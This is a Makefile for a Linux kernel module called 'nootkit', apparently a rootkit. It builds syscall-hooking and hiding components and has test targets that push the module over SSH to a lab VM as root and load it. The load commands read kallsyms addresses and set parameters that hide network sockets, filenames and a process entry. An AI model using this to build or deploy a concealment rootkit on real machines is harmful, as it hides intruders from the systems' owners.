KDIR := ${PWD}/kernel-headers/linux-headers-5.15.0-76-generic
obj-m := nootkit.o
nootkit-y := src/nootkit_main.o src/ksyms.o src/config.o
nootkit-y += src/hide/readdir.o src/hide/proc_net.o src/hide/net.o
nootkit-y += src/arch/x86_64/hook.o src/arch/x86_64/mm.o
nootkit-y += src/arch/x86_64/hide/readdir_sys.o

ccflags-y := -I$(src)/src

TEST_IP := 192.168.122.122

default: build

build:
	make -C ${KDIR} M=${PWD} modules

clean:
	make -C ${KDIR} M=${PWD} clean

test-remove:
	-sshpass -pa ssh root@${TEST_IP} "rmmod nootkit"
	-sshpass -pa ssh root@${TEST_IP} "rm /nootkit.ko"

test-upload: build
	sshpass -pa scp nootkit.ko root@${TEST_IP}:/

test-hide-socket: build test-remove test-upload
	sshpass -pa ssh root@${TEST_IP} \
	insmod /nootkit.ko \
	' \
	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
	"hide_sockets=\" \
	PROTO = 1; LOCAL = 0.0.0.0/0.0.0.0:1300-1400; FOREIGN = 0.0.0.0/0.0.0.0:0-65535; 	\
	\"" \
	'

test-hide-filename: build test-remove test-upload
	sshpass -pa ssh root@${TEST_IP} \
	insmod /nootkit.ko \
	' \
	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
	hide_filenames=hello,/root/yellow,/proc/5403,/root/hallo \
	'

# test: test-hide-filename test-hide-socket
